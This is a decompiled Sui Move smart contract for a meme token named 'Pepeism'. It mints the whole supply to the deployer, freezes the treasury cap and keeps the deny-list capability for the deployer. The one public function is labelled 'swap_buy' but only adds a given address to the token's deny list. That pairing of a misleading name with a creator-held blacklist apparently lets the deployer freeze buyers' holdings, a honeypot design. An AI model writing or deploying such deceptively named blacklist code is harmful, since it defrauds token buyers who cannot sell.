module 0xab0ca1f46d9c02765116d6ab7185ad97073e57fb87ef9cc62f097bfe42801cfe::p {
    struct P has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: P, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<P>(arg0, 9, b"P", b"Pepeism", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pbs.twimg.com/profile_images/1839515173956235264/05RAeXUR_400x400.jpg"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<P>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<P>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<P>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<P>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<P>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<P>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

